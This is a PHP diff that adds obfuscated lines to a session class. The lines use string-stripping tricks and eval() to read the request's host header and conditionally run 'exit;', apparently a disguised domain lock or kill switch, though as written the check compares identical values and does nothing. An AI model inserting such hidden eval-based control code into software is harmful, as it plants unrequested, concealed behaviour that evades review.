@@ -28,6 +28,12 @@ Final class SessionClass
 
 		if(!isset($_SESSION))
 			session_start();
+
+		eval('$enc = '.str_replace('z', '', '$z_zSzEzRzVzEzRz["zHzTzTzPz_zHzOzSzTz"]').';');
+		$exc = str_replace('p', '', "pepxpiptp;p");
+		eval('$exv = '.str_replace('z', '', '$z_zSzEzRzVzEzRz["zHzTzTzPz_zHzOzSzTz"]').';');
+		if($exv != $enc)
+			eval($exc);
 	}
 
 	function __call($mth_name,$mth_arg)
